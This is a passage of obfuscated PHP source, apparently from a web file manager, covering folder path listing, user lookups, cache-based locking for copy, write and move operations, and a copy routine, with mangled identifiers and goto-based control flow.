$AÊÂ¼÷Ô£î .= $fîÈğŞë£[$B¶íÆ¸º‚] . $eàŸ¶óÑ´[8]; } } if ($CÍ»ÍÜìÄÏ) { $AÊÂ¼÷Ô£î .= $FØ¯§ñ«Î†[$eàŸ¶óÑ´[28]]; } $fË–¼ä¦ [$b»ò£ß¡‚©] = $AÊÂ¼÷Ô£î; } if ($FØ¯§ñ«Î†[$eàŸ¶óÑ´[401]]) { $AÊÂ¼÷Ô£î .= $eàŸ¶óÑ´[8]; } goto E—á›¥®µæ; E†Ø´ÖìÚ: if (intval($FØ¯§ñ«Î†[$eàŸ¶óÑ´[402]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($FØ¯§ñ«Î†, $CÍ»ÍÜìÄÏ, $F¿³ô†ÓËÚ); } goto d‚«î¦¤Ã½; E—á›¥®µæ: $FØ¯§ñ«Î†[$eàŸ¶óÑ´[493]] = str_replace($eàŸ¶óÑ´[494], $eàŸ¶óÑ´[8], $AÊÂ¼÷Ô£î); $fî×—õ§ğ– = trim($FØ¯§ñ«Î†[$eàŸ¶óÑ´[493]], $eàŸ¶óÑ´[8]); if ($FØ¯§ñ«Î†[$eàŸ¶óÑ´[476]] == $eàŸ¶óÑ´[495] && $fî×—õ§ğ–) { $FØ¯§ñ«Î†[$eàŸ¶óÑ´[28]] = $fî×—õ§ğ–; } goto E†Ø´ÖìÚ; d‚«î¦¤Ã½: } goto c‚á…ˆ˜İ; c‚á…ˆ˜İ: unset($FØ¯§ñ«Î†); return $dÙïÇçºôˆ; goto FßÓ…Á…ß©; EéÏˆìóâŒ: $cñ‘àŸàå† = array(); foreach ($dÙïÇçºôˆ as &$FØ¯§ñ«Î†) { $f‡øæÌÉƒä = $FØ¯§ñ«Î†[$eàŸ¶óÑ´[401]] == $eàŸ¶óÑ´[87]; if ($f‡øæÌÉƒä) { $fîÈğŞë£[$FØ¯§ñ«Î†[$eàŸ¶óÑ´[394]]] = $FØ¯§ñ«Î†[$eàŸ¶óÑ´[28]]; } if (isset($cñ‘àŸàå†[$FØ¯§ñ«Î†[$eàŸ¶óÑ´[485]]])) { continue; } $cñ‘àŸàå†[$FØ¯§ñ«Î†[$eàŸ¶óÑ´[485]]] = !0; $CÍ»ÍÜìÄÏ = $this->parentLevelArray($FØ¯§ñ«Î†[$eàŸ¶óÑ´[485]]); foreach ($CÍ»ÍÜìÄÏ as $dîèõ‡„¥½ => $B¶íÆ¸º‚) { if ($dîèõ‡„¥½ != 0 && !isset($fîÈğŞë£[$B¶íÆ¸º‚])) { $c ¸õêÃñœ[] = $B¶íÆ¸º‚; } } } unset($FØ¯§ñ«Î†); goto BçˆìÔ‡¶Ù; FßÓ…Á…ß©: } private function _listAppendPathRecycle(&$aÆÌïêÔÂ, $Eæ‰–‚ØÌº, $bÙŠÙ¡ùƒ) { goto B½éÈÏÆ„Ì; B½éÈÏÆ„Ì: $Fñ…Àªöë¢ =& $_SERVER[Ç³Íß¦Ó]; if (!in_array($bÙŠÙ¡ùƒ, $Eæ‰–‚ØÌº) && $aÆÌïêÔÂ[$Fñ…Àªöë¢[394]] != $bÙŠÙ¡ùƒ) { return; } $A’òÜƒÔƒ… = explode($Fñ…Àªöë¢[8], trim($aÆÌïêÔÂ[$Fñ…Àªöë¢[493]], $Fñ…Àªöë¢[8])); goto e±·˜‘¥«½; a”º¾§ÅÙİ: if ($aÆÌïêÔÂ[$Fñ…Àªöë¢[394]] == $bÙŠÙ¡ùƒ) { $aÆÌïêÔÂ[$Fñ…Àªöë¢[485]] = $Fñ…Àªöë¢[497]; $aÆÌïêÔÂ[$Fñ…Àªöë¢[476]] = $Fñ…Àªöë¢[495]; $aÆÌïêÔÂ[$Fñ…Àªöë¢[28]] = LNG($Fñ…Àªöë¢[496]); } $aÆÌïêÔÂ[$Fñ…Àªöë¢[498]] = $Fñ…Àªöë¢[499]; goto dÌ‰”²÷Â’; e±·˜‘¥«½: $C£í¿†Î±Ô = implode($Fñ…Àªöë¢[8], array_slice($A’òÜƒÔƒ…, 2)); $aÆÌïêÔÂ[$Fñ…Àªöë¢[493]] = $Fñ…Àªöë¢[8] . LNG($Fñ…Àªöë¢[496]) . $Fñ…Àªöë¢[8] . ltrim($C£í¿†Î±Ô, $Fñ…Àªöë¢[8]); $aÆÌïêÔÂ[$Fñ…Àªöë¢[485]] = $Fñ…Àªöë¢[497] . implode($Fñ…Àªöë¢[47], array_slice($Eæ‰–‚ØÌº, 1)) . $Fñ…Àªöë¢[47]; goto a”º¾§ÅÙİ; dÌ‰”²÷Â’: } protected function _listAppendPathRoot(&$E×ÀíœŠŞ, $Fªª¿®¼ğ´) { $bÈ²Úî¾æ =& $_SERVER[Ç³Íß¦Ó]; $CÓ¦˜¯Ÿ‡° = $bÈ²Úî¾æ[33]; if ($E×ÀíœŠŞ[$bÈ²Úî¾æ[402]] == self::TYPE_USER) { if (defined($bÈ²Úî¾æ[452]) && $E×ÀíœŠŞ[$bÈ²Úî¾æ[482]] == USER_ID) { $CÓ¦˜¯Ÿ‡° = LNG($bÈ²Úî¾æ[500]); if (!$Fªª¿®¼ğ´) { $E×ÀíœŠŞ[$bÈ²Úî¾æ[28]] = $CÓ¦˜¯Ÿ‡°; } } else { $Cµï„—øĞç = Model($bÈ²Úî¾æ[501])->getInfoSimple($E×ÀíœŠŞ[$bÈ²Úî¾æ[482]]); $CÓ¦˜¯Ÿ‡° = LNG($bÈ²Úî¾æ[502]) . $bÈ²Úî¾æ[160] . $Cµï„—øĞç[$bÈ²Úî¾æ[28]] . $bÈ²Úî¾æ[503]; } } else { if ($E×ÀíœŠŞ[$bÈ²Úî¾æ[402]] == self::TYPE_GROUP) { $Cµï„—øĞç = Model($bÈ²Úî¾æ[484])->getInfoSimple($E×ÀíœŠŞ[$bÈ²Úî¾æ[482]]); $CÓ¦˜¯Ÿ‡° = $Cµï„—øĞç[$bÈ²Úî¾æ[28]]; } else { if ($E×ÀíœŠŞ[$bÈ²Úî¾æ[402]] == self::TYPE_SYSTEM) { $CÓ¦˜¯Ÿ‡° = $bÈ²Úî¾æ[504]; } } } $CÓ¦˜¯Ÿ‡° = $CÓ¦˜¯Ÿ‡° ? $bÈ²Úî¾æ[8] . $CÓ¦˜¯Ÿ‡° . $bÈ²Úî¾æ[8] : $bÈ²Úî¾æ[8]; return $CÓ¦˜¯Ÿ‡°; } protected function _listAppendUser(&$CÕÖ¼Ñª–±) { goto A²‘¿½ßÆñ; D‘·×‹‚ÇÒ: $B§Îš§Šö‰ = array_merge($e‹ñê¨†è, $a”Û÷À£º); $Fí¿Şßô› = Model($e‡îÃŠîÂË[505])->userListInfo($B§Îš§Šö‰); foreach ($CÕÖ¼Ñª–± as &$EÂ…°œßŒ) { $Aƒ¼ÛôÇÈæ = $EÂ…°œßŒ[$e‡îÃŠîÂË[430]]; $EÂ…°œßŒ[$e‡îÃŠîÂË[430]] = $Fí¿Şßô›[$Aƒ¼ÛôÇÈæ] ? $Fí¿Şßô›[$Aƒ¼ÛôÇÈæ] : !1; $Aƒ¼ÛôÇÈæ = $EÂ…°œßŒ[$e‡îÃŠîÂË[432]]; $EÂ…°œßŒ[$e‡îÃŠîÂË[432]] = $Fí¿Şßô›[$Aƒ¼ÛôÇÈæ] ? $Fí¿Şßô›[$Aƒ¼ÛôÇÈæ] : !1; if (isset($EÂ…°œßŒ[$e‡îÃŠîÂË[443]]) && $EÂ…°œßŒ[$e‡îÃŠîÂË[443]][$e‡îÃŠîÂË[506]]) { $aâˆÅší˜ = $GLOBALS[$e‡îÃŠîÂË[6]][$e‡îÃŠîÂË[88]][$e‡îÃŠîÂË[507]]; if ($EÂ…°œßŒ[$e‡îÃŠîÂË[443]][$e‡îÃŠîÂË[508]] <= time() - $aâˆÅší˜) { $this->metaSet($EÂ…°œßŒ[$e‡îÃŠîÂË[394]], $e‡îÃŠîÂË[506], null); $this->metaSet($EÂ…°œßŒ[$e‡îÃŠîÂË[394]], $e‡îÃŠîÂË[508], null); unset($EÂ…°œßŒ[$e‡îÃŠîÂË[443]][$e‡îÃŠîÂË[506]]); continue; } $cô®º Ø = $EÂ…°œßŒ[$e‡îÃŠîÂË[443]][$e‡îÃŠîÂË[506]]; $EÂ…°œßŒ[$e‡îÃŠîÂË[443]][$e‡îÃŠîÂË[509]] = Model($e‡îÃŠîÂË[505])->getInfoSimpleOuter($cô®º Ø); } } goto cŞ»Úãô½ò; cŞ»Úãô½ò: unset($EÂ…°œßŒ); goto CÒô”ÎÎâÎ; A²‘¿½ßÆñ: $e‡îÃŠîÂË =& $_SERVER[Ç³Íß¦Ó]; $e‹ñê¨†è = array_to_keyvalue($CÕÖ¼Ñª–±, $e‡îÃŠîÂË[33], $e‡îÃŠîÂË[430]); $a”Û÷À£º = array_to_keyvalue($CÕÖ¼Ñª–±, $e‡îÃŠîÂË[33], $e‡îÃŠîÂË[432]); goto D‘·×‹‚ÇÒ; CÒô”ÎÎâÎ: } public function parentLevelArray($EĞÎ¿àØÛˆ) { $fŸšÍƒï =& $_SERVER[Ç³Íß¦Ó]; $EĞÎ¿àØÛˆ = explode($fŸšÍƒï[47], trim($EĞÎ¿àØÛˆ, $fŸšÍƒï[47])); return array_remove_value($EĞÎ¿àØÛˆ, $fŸšÍƒï[495]); } public function listAll($dî Ê©ìÏ×) { goto f•„ñ›Õ”; CæÅ÷ŞÈğ„: $this->_listAppendAuth($cñ¿‡õñŠ¢); $this->_listAppendUser($cñ¿‡õñŠ¢); $this->_listAppendPath($cñ¿‡õñŠ¢); goto båƒö•‘½£; f•„ñ›Õ”: $cºˆ†ÒËë =& $_SERVER[Ç³Íß¦Ó]; $E®Æ¥«ß™£ = $this->sourceInfo($dî Ê©ìÏ×); $AÈ”Œİß§Ó = array($cºˆ†ÒËë[510] => array($cºˆ†ÒËë[511], $E®Æ¥«ß™£[$cºˆ†ÒËë[485]] . $dî Ê©ìÏ× . $cºˆ†ÒËë[512]), $cºˆ†ÒËë[513] => 0); goto bÂÑ‘¥½Ñ; B‹²ÎŞôÎ: $dê¹ñ‰‘ÏË = array(); foreach ($cñ¿‡õñŠ¢ as $bÛ¤…Ï§ => $dÂ¨’ÎŞÛ½) { goto B„äÒ»á´Î; DÃ®ºöŠ¯á: $bó´íŸ©§ƒ = str_replace($cºˆ†ÒËë[494], $cºˆ†ÒËë[8], $bó´íŸ©§ƒ); $bó´íŸ©§ƒ = str_replace($cºˆ†ÒËë[494], $cºˆ†ÒËë[8], $bó´íŸ©§ƒ); $câùËµ“¯ = array($cºˆ†ÒËë[412] => str_replace($cºˆ†ÒËë[494], $cºˆ†ÒËë[8], $bó´íŸ©§ƒ), $cºˆ†ÒËë[516] => intval($dÂ¨’ÎŞÛ½[$cºˆ†ÒËë[401]]), $cºˆ†ÒËë[85] => $this->pathInfoFilter($dÂ¨’ÎŞÛ½)); goto d±öØÆ°É; A±Û“ëæ: for ($a„‘„—¼ñ× = 0; $a„‘„—¼ñ× < count($aö„âø¯…Ê); $a„‘„—¼ñ×++) { $bó´íŸ©§ƒ .= $cñ¿‡õñŠ¢[$aö„âø¯…Ê[$a„‘„—¼ñ×]][$cºˆ†ÒËë[28]] . $cºˆ†ÒËë[8]; } $bó´íŸ©§ƒ .= $dÂ¨’ÎŞÛ½[$cºˆ†ÒËë[28]]; if ($dÂ¨’ÎŞÛ½[$cºˆ†ÒËë[401]]) { $bó´íŸ©§ƒ .= $cºˆ†ÒËë[8]; } goto DÃ®ºöŠ¯á; d±öØÆ°É: if (!$dÂ¨’ÎŞÛ½[$cºˆ†ÒËë[401]]) { $câùËµ“¯[$cºˆ†ÒËë[445]] = $dÂ¨’ÎŞÛ½[$cºˆ†ÒËë[445]]; $câùËµ“¯[$cºˆ†ÒËë[86]] = $dÂ¨’ÎŞÛ½[$cºˆ†ÒËë[76]]; } $dê¹ñ‰‘ÏË[] = $câùËµ“¯; goto f‰¾ñœèŞù; B„äÒ»á´Î: $aö„âø¯…Ê = $this->parentLevelArray($dÂ¨’ÎŞÛ½[$cºˆ†ÒËë[485]]); array_shift($aö„âø¯…Ê); $bó´íŸ©§ƒ = $F´‘ç§çÚä; goto A±Û“ëæ; f‰¾ñœèŞù: } return $dê¹ñ‰‘ÏË; goto CéñóíÔ…; bÂÑ‘¥½Ñ: $D‹šğãï„¢ = $cºˆ†ÒËë[514]; $aŞŠ”Ñâ˜ = "\x4c\x45\106\124\x20\x4a\x4f\111\x4e\x20{$this->tablePrefix}\151\x6f\137\x66\x69\154\x65\x20\146\151\154\145\x20\157\156\40\163\157\x75\162\143\145\x2e\x66\151\x6c\145\111\104\x20\75\x20\x66\x69\154\145\x2e\x66\x69\x6c\x65\111\x44"; $cñ¿‡õñŠ¢ = $this->alias($cºˆ†ÒËë[515])->field($D‹šğãï„¢)->where($AÈ”Œİß§Ó)->join($aŞŠ”Ñâ˜)->select(); goto CæÅ÷ŞÈğ„; båƒö•‘½£: $cñ¿‡õñŠ¢ = array_to_keyvalue($cñ¿‡õñŠ¢, $cºˆ†ÒËë[394]); $F´‘ç§çÚä = "\x2f{$E®Æ¥«ß™£[$cºˆ†ÒËë[28]]}\57"; $F´‘ç§çÚä = $F´‘ç§çÚä == $cºˆ†ÒËë[494] ? $cºˆ†ÒËë[8] : $F´‘ç§çÚä; goto B‹²ÎŞôÎ; CéñóíÔ…: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($bñÊÊ×‚ãß) { goto dğïò³µ²; cŠ“„‹Ş„Ô: $fêµâ•»˜¢ = 1; $this->_lockEvent($bñÊÊ×‚ãß, array($dŠ±ó“øöœ[518], $dŠ±ó“øöœ[519]), $fêµâ•»˜¢); $this->_lockParent($bñÊÊ×‚ãß, array($dŠ±ó“øöœ[519]), $fêµâ•»˜¢); goto AÕÅŞ…Öä¦; AÕÅŞ…Öä¦: $this->_lockEvent($bñÊÊ×‚ãß, array($dŠ±ó“øöœ[520], $dŠ±ó“øöœ[521]), $fêµâ•»˜¢); $this->_lockCheckEnd($dŠ±ó“øöœ[517], $bñÊÊ×‚ãß); goto CÄ¬²ôâÅ£; dğïò³µ²: $dŠ±ó“øöœ =& $_SERVER[Ç³Íß¦Ó]; if (!$this->allowLock()) { return; } $this->_lockCheck($dŠ±ó“øöœ[517], $bñÊÊ×‚ãß); goto cŠ“„‹Ş„Ô; CÄ¬²ôâÅ£: } public function lockCopyEnd($eÕÎ¿½ÆÂã) { $EˆèîØèß =& $_SERVER[Ç³Íß¦Ó]; if (!$this->allowLock()) { return; } $bÁ¤íºğæÜ = 0; $this->_lockEvent($eÕÎ¿½ÆÂã, array($EˆèîØèß[518], $EˆèîØèß[519]), $bÁ¤íºğæÜ); $this->_lockParent($eÕÎ¿½ÆÂã, array($EˆèîØèß[519]), $bÁ¤íºğæÜ); $this->_lockEvent($eÕÎ¿½ÆÂã, array($EˆèîØèß[520], $EˆèîØèß[521]), $bÁ¤íºğæÜ); } public function lockWriteStart($CÓÒ©šó¾, $b¢œÜ¸ÙñŠ = '') { goto dÔùÔˆÏ¤…; CƒñË¸½Ê: $f°Ñù÷òˆ = 1; $this->_lockKey($AğÏÊ÷×íÑ[522] . $CÓÒ©šó¾ . $AğÏÊ÷×íÑ[95] . $b¢œÜ¸ÙñŠ, $f°Ñù÷òˆ); $this->_lockEvent($CÓÒ©šó¾, array($AğÏÊ÷×íÑ[517], $AğÏÊ÷×íÑ[519]), $f°Ñù÷òˆ); goto dŠÜ”«ë›…; dŠÜ”«ë›…: $this->_lockParent($CÓÒ©šó¾, array($AğÏÊ÷×íÑ[517], $AğÏÊ÷×íÑ[519]), $f°Ñù÷òˆ); $this->_lockCheckEnd($AğÏÊ÷×íÑ[518], $CÓÒ©šó¾); goto AáìÇá‚¬í; dÔùÔˆÏ¤…: $AğÏÊ÷×íÑ =& $_SERVER[Ç³Íß¦Ó]; if (!$this->allowLock()) { return; } $this->_lockCheck($AğÏÊ÷×íÑ[518], $CÓÒ©šó¾); goto CƒñË¸½Ê; AáìÇá‚¬í: } public function lockWriteEnd($A«ŠÇãô¼Ï, $fÛó’ ²Ù¼ = '') { $CÚ‡Ğ’¢ =& $_SERVER[Ç³Íß¦Ó]; if (!$this->allowLock()) { return; } $d½„«Í¯£È = 0; $this->_lockKey($CÚ‡Ğ’¢[522] . $A«ŠÇãô¼Ï . $CÚ‡Ğ’¢[95] . $fÛó’ ²Ù¼, $d½„«Í¯£È); $this->_lockEvent($A«ŠÇãô¼Ï, array($CÚ‡Ğ’¢[517], $CÚ‡Ğ’¢[519]), $d½„«Í¯£È); $this->_lockParent($A«ŠÇãô¼Ï, array($CÚ‡Ğ’¢[517], $CÚ‡Ğ’¢[519]), $d½„«Í¯£È); } public function lockMoveStart($b®¼–º¶Ø•) { goto e÷Êœ©îÜå; C“‡Ûï¶µ: $this->_lockParent($b®¼–º¶Ø•, array($a¢É—¥İ„É[517], $a¢É—¥İ„É[519]), $F˜àôã õÄ); $this->_lockEvent($b®¼–º¶Ø•, array($a¢É—¥İ„É[524], $a¢É—¥İ„É[520], $a¢É—¥İ„É[521]), $F˜àôã õÄ); $this->_lockCheckEnd($a¢É—¥İ„É[519], $b®¼–º¶Ø•); goto bŞ‡á¨­éé; aÕ¢ÇôØ¼: $F˜àôã õÄ = 1; $this->_lockKey($a¢É—¥İ„É[523] . $b®¼–º¶Ø•, $F˜àôã õÄ); $this->_lockEvent($b®¼–º¶Ø•, array($a¢É—¥İ„É[517], $a¢É—¥İ„É[518]), $F˜àôã õÄ); goto C“‡Ûï¶µ; e÷Êœ©îÜå: $a¢É—¥İ„É =& $_SERVER[Ç³Íß¦Ó]; if (!$this->allowLock()) { return; } $this->_lockCheck($a¢É—¥İ„É[519], $b®¼–º¶Ø•); goto aÕ¢ÇôØ¼; bŞ‡á¨­éé: } public function lockMoveEnd($fßÜ²¦) { goto aÊÌ‹¥Ç½Œ; eÁ´Š‰¿òì: $this->_lockKey($cé‘éÑ™ø¸[523] . $fßÜ²¦, $E¿èÉË¢); $this->_lockEvent($fßÜ²¦, array($cé‘éÑ™ø¸[517], $cé‘éÑ™ø¸[518]), $E¿èÉË¢); $this->_lockParent($fßÜ²¦, array($cé‘éÑ™ø¸[517], $cé‘éÑ™ø¸[519]), $E¿èÉË¢); goto c›îŠö¼ï¥; aÊÌ‹¥Ç½Œ: $cé‘éÑ™ø¸ =& $_SERVER[Ç³Íß¦Ó]; if (!$this->allowLock()) { return; } $E¿èÉË¢ = 0; goto eÁ´Š‰¿òì; c›îŠö¼ï¥: $this->_lockEvent($fßÜ²¦, array($cé‘éÑ™ø¸[524], $cé‘éÑ™ø¸[520], $cé‘éÑ™ø¸[521]), $E¿èÉË¢); goto cä´èå±ë›; cä´èå±ë›: } private function _lockCheck($F„¥„Î®«Õ, $F¨æÕˆ¥) { goto EæŞÀÔÃ¬ª; eæËĞŠ¢­‰: $Bˆóç®Şñ½ = array_reverse($this->parentLevelArray($d§öîÄ»©[$f–±¿À¾¦Û[485]])); foreach ($Bˆóç®Şñ½ as $CÍÖ†ˆæ„©) { $D¿È¹µ‘ = $F„¥„Î®«Õ . $f–±¿À¾¦Û[526] . $CÍÖ†ˆæ„©; if (CacheLock::lockGet($f–±¿À¾¦Û[527] . $D¿È¹µ‘)) { $d§öîÄ»© = $this->sourceInfo($CÍÖ†ˆæ„©); CacheLock::setErrorMsg($f–±¿À¾¦Û[160] . htmlspecialchars($d§öîÄ»©[$f–±¿À¾¦Û[28]]) . $f–±¿À¾¦Û[503] . $aá’‹é³Ûƒ); $this->_lockKey($D¿È¹µ‘, 1); $this->_lockKey($D¿È¹µ‘, 0); } } goto f‡Ä–ŒƒÁõ; Aä­Óåç£Õ: CacheLock::setErrorMsg($f–±¿À¾¦Û[160] . htmlspecialchars($d§öîÄ»©[$f–±¿À¾¦Û[28]]) . $f–±¿À¾¦Û[503] . $aá’‹é³Ûƒ); $this->_lockKey($D¿È¹µ‘, 1); $this->_lockKey($D¿È¹µ‘, 0); goto eæËĞŠ¢­‰; EæŞÀÔÃ¬ª: $f–±¿À¾¦Û =& $_SERVER[Ç³Íß¦Ó]; $d§öîÄ»© = $this->sourceInfo($F¨æÕˆ¥); $D¿È¹µ‘ = $F„¥„Î®«Õ . $f–±¿À¾¦Û[95] . $F¨æÕˆ¥; goto C¾Ä²‘œ½Ğ; C¾Ä²‘œ½Ğ: $this->_lockTimeStart[$D¿È¹µ‘] = timeFloat(); if (!is_array($d§öîÄ»©)) { return; } $aá’‹é³Ûƒ = LNG($f–±¿À¾¦Û[525]); goto Aä­Óåç£Õ; f‡Ä–ŒƒÁõ: } private function _lockCheckEnd($DÀ®Œ…ÙëÄ, $eó‹Î»ËÛÌ) { goto fÑ¦ğØğçİ; fÑ¦ğØğçİ: $bá‡è·ÜèÙ =& $_SERVER[Ç³Íß¦Ó]; $a‹Ö†Ì¥¶ = $DÀ®Œ…ÙëÄ . $bá‡è·ÜèÙ[95] . $eó‹Î»ËÛÌ; CacheLock::setErrorMsg($bá‡è·ÜèÙ[374]); goto f½…„Ü­¥; f½…„Ü­¥: if (!isset($this->_lockTimeStart[$a‹Ö†Ì¥¶])) { return; } $E¹ÛÎŞ²‰Æ = timeFloat() - $this->_lockTimeStart[$a‹Ö†Ì¥¶]; unset($this->_lockTimeStart[$a‹Ö†Ì¥¶]); goto a÷ÁÜÜ³éè; a÷ÁÜÜ³éè: if ($E¹ÛÎŞ²‰Æ > 0.5) { unset(self::$cacheSourceInfo[$bá‡è·ÜèÙ[436] . $eó‹Î»ËÛÌ]); } $DÀ§à¶£º’ = $this->sourceInfo($eó‹Î»ËÛÌ); if (!$DÀ§à¶£º’) { show_json(LNG($bá‡è·ÜèÙ[105]), !1); } goto C™º«‹˜¹; C™º«‹˜¹: } private function _lockParent($C‘„Î¢à¹ç, $Cù¶˜¿Èñ, $bñ§‹™­à‡) { if (!$this->autoLockSet) { return; } $B•Éè‡Ú·¼ = $this->sourceInfo($C‘„Î¢à¹ç); if (!is_array($B•Éè‡Ú·¼)) { return; } $BÚÃä˜¦‚ = array_reverse($this->parentLevelArray($B•Éè‡Ú·¼[$_SERVER[Ç³Íß¦Ó][485]])); foreach ($BÚÃä˜¦‚ as $Cï¤¸àâÇ) { $this->_lockEvent($Cï¤¸àâÇ, $Cù¶˜¿Èñ, $bñ§‹™­à‡); } } private function _lockEvent($b›³¢ƒ·, $eäÄ‰ƒĞ´Ç, $fĞ¯Ú°„ø‘) { $E†ñ‚Ú¶·µ =& $_SERVER[Ç³Íß¦Ó]; if (!$this->autoLockSet) { return; } foreach ($eäÄ‰ƒĞ´Ç as $C¬éµˆ¹) { $a‹¹ê¿–½ = $C¬éµˆ¹ . $E†ñ‚Ú¶·µ[95] . $b›³¢ƒ·; if ($fĞ¯Ú°„ø‘ && CacheLock::lockGet($E†ñ‚Ú¶·µ[527] . $a‹¹ê¿–½)) { continue; } $this->_lockKey($a‹¹ê¿–½, $fĞ¯Ú°„ø‘); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($E¤ø÷ïèº, $c”œ»¸¡ÏŞ = 1) { $eÈÄ°ßƒä = $_SERVER[Ç³Íß¦Ó][527] . md5($E¤ø÷ïèº); if ($c”œ»¸¡ÏŞ) { if (isset(self::$_lockItemArr[$eÈÄ°ßƒä])) { return; } self::$_lockItemArr[$eÈÄ°ßƒä] = 1; CacheLock::lock($eÈÄ°ßƒä, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$eÈÄ°ßƒä])) { return; } unset(self::$_lockItemArr[$eÈÄ°ßƒä]); CacheLock::unlock($eÈÄ°ßƒä); } } public function isParentOf($fßÓó¡Øˆè, $b—İÖ½ÀÛå) { goto c›ò¾Î†ñ›; EâêÏğÛªƒ: $CÚÕ¼ŞóÎ = $BŒ’¾’Ü[$EÜœ³”Æˆî[485]] . $BŒ’¾’Ü[$EÜœ³”Æˆî[394]] . $EÜœ³”Æˆî[47]; $E¬ÅŒéí„ã = $C‰ï¢´Ñ¥È[$EÜœ³”Æˆî[485]] . $C‰ï¢´Ñ¥È[$EÜœ³”Æˆî[394]] . $EÜœ³”Æˆî[47]; $cÆàà ùÊƒ = strpos($E¬ÅŒéí„ã, $CÚÕ¼ŞóÎ) === 0; goto f”¥ÈÜšÌî; c›ò¾Î†ñ›: $EÜœ³”Æˆî =& $_SERVER[Ç³Íß¦Ó]; $BŒ’¾’Ü = $this->sourceInfo($fßÓó¡Øˆè); $C‰ï¢´Ñ¥È = $this->sourceInfo($b—İÖ½ÀÛå); goto EâêÏğÛªƒ; f”¥ÈÜšÌî: return $cÆàà ùÊƒ; goto FĞÎåğ£ç‚; FĞÎåğ£ç‚: } private $targetIsDelete = 0; public function copy($C¦Ø¾ÄÖ˜, $Bƒ àÃËàË, $A£¾Ã½Ô À = REPEAT_REPLACE, $AäŒëï–¾ù = '') { goto b£éŞêÇÄ; E®»Š‹¤“: $this->updateModifyTime($Bƒ àÃËàË); return $Fƒ¡©†ÄÎÏ; goto a±ó„£èã«; f·ÜÏÉ–‘¸: $this->targetIsDelete = intval($F·ã¨Ã›˜…[$f•¾’ÎØİ[421]]); $DÎšÌåƒ˜Ä = $this->fileNameExistCache($Bƒ àÃËàË, $F·ã¨Ã›˜…[$f•¾’ÎØİ[28]]); $Fƒ¡©†ÄÎÏ = $this->_copy($C¦Ø¾ÄÖ˜, $Bƒ àÃËàË, $A£¾Ã½Ô À, $Eãä¢§×Ì, !0, $AäŒëï–¾ù); goto aô‰¢İƒ¬Æ; b£éŞêÇÄ: $f•¾’ÎØİ =& $_SERVER[Ç³Íß¦Ó]; $F·ã¨Ã›˜… = $this->sourceInfo($C¦Ø¾ÄÖ˜); $d‡Ê¯ğª« = $this->sourceInfo($Bƒ àÃËàË); goto c³Ùõ¦Œ”µ; FªŞ«÷Ş¶‘: $this->saveAll($Eãä¢§×Ì[$f•¾’ÎØİ[530]]); Model($f•¾’ÎØİ[192])->linkAdd($Eãä¢§×Ì[$f•¾’ÎØİ[528]]); $this->folderSizeReset($Bƒ àÃËàË); goto E®»Š‹¤“; c³Ùõ¦Œ”µ: if (!$F·ã¨Ã›˜… || !$d‡Ê¯ğª« || $d‡Ê¯ğª«[$f•¾’ÎØİ[401]] != $f•¾’ÎØİ[87]) { return !1; } if ($this->isParentOf($C¦Ø¾ÄÖ˜, $Bƒ àÃËàË)) { return !1; } $EùõïÒ×¨ = $AäŒëï–¾ù ? $AäŒëï–¾ù : $F·ã¨Ã›˜…[$f•¾’ÎØİ[28]]; goto Eí™é°¬ç®; Eí™é°¬ç®: $this->lockCopyStart($C¦Ø¾ÄÖ˜); $this->lockWriteStart($Bƒ àÃËàË, $EùõïÒ×¨); $Eãä¢§×Ì = array($f•¾’ÎØİ[528] => array(), $f•¾’ÎØİ[529] => array(), $f•¾’ÎØİ[530] => array()); goto f·ÜÏÉ–‘¸; aô‰¢İƒ¬Æ: $this->_childrenListClear(); $this->lockCopyEnd($C¦Ø¾ÄÖ˜); $this->lockWriteEnd($Bƒ àÃËàË, $EùõïÒ×¨); goto dÚŒÊ÷Ã£; dÚŒÊ÷Ã£: if ($F·ã¨Ã›˜…[$f•¾’ÎØİ[401]] == $f•¾’ÎØİ[87] && $DÎšÌåƒ˜Ä == $Fƒ¡©†ÄÎÏ) { $this->folderSizeResetChildren($DÎšÌåƒ˜Ä); } Model($f•¾’ÎØİ[531])->addAll($Eãä¢§×Ì[$f•¾’ÎØİ[529]], array(), !0); if ($DÎšÌåƒ˜Ä != $Fƒ¡©†ÄÎÏ || $F·ã¨Ã›˜…[$f•¾’ÎØİ[401]] == $f•¾’ÎØİ[87]) { Model($f•¾’ÎØİ[532])->eventCopy($Fƒ¡©†ÄÎÏ); } goto FªŞ«÷Ş¶‘; a±ó„£èã«: } private function _copy($EôÄ¼˜·¤Ë, $aß¡Ë…±¾ò, $FÍåÉ©«¼, &$D¡áŸÚ‹š¨, $c¼ßÀÀƒÁÑ, $DŠÙ…·ª•· = '') { goto eµÌÊÅ™¯°; aÂ»†¿Õƒ: return $Eë¯‚ˆè“³; goto dò¼ÓÚÆÀ; eµÌÊÅ™¯°: $Eì¢ò°÷¸ô =& $_SERVER[Ç³Íß¦Ó]; $eæ‘ÏŞ”Íâ = $this->sourceInfoCache($EôÄ¼˜·¤Ë); $AÉø¤·ğµÈ = $eæ‘ÏŞ”Íâ[$Eì¢ò°÷¸ô[401]] == $Eì¢ò°÷¸ô[87]; goto C§ËçôÉõ‹; C§ËçôÉõ‹: $D‡¤Àèãõ = $DŠÙ…·ª•· ? $DŠÙ…·ª•· : $eæ‘ÏŞ”Íâ[$Eì¢ò°÷¸ô[28]]; $f†è£‰íÛ = $this->fileNameExistCache($aß¡Ë…±¾ò, $D‡¤Àèãõ); if ($c¼ßÀÀƒÁÑ) { $this->_childrenAllMake($EôÄ¼˜·¤Ë); if ($AÉø¤·ğµÈ && $f†è£‰íÛ) { $this->_childrenAllMake($f†è£‰íÛ); } } goto d„±Ç¸ËÃÑ; d„±Ç¸ËÃÑ: if (!$f†è£‰íÛ) { return $this->_copyCreate($EôÄ¼˜·¤Ë, $aß¡Ë…±¾ò, $D‡¤Àèãõ, $D¡áŸÚ‹š¨); } $Eë¯‚ˆè“³ = $f†è£‰íÛ; if ($AÉø¤·ğµÈ) { if ($FÍåÉ©«¼ == REPEAT_RENAME_FOLDER) { $D‡¤Àèãõ = $this->fileNameAutoCache($aß¡Ë…±¾ò, $D‡¤Àèãõ, $FÍåÉ©«¼, $AÉø¤·ğµÈ); $Eë¯‚ˆè“³ = $this->_copyCreate($EôÄ¼˜·¤Ë, $aß¡Ë…±¾ò, 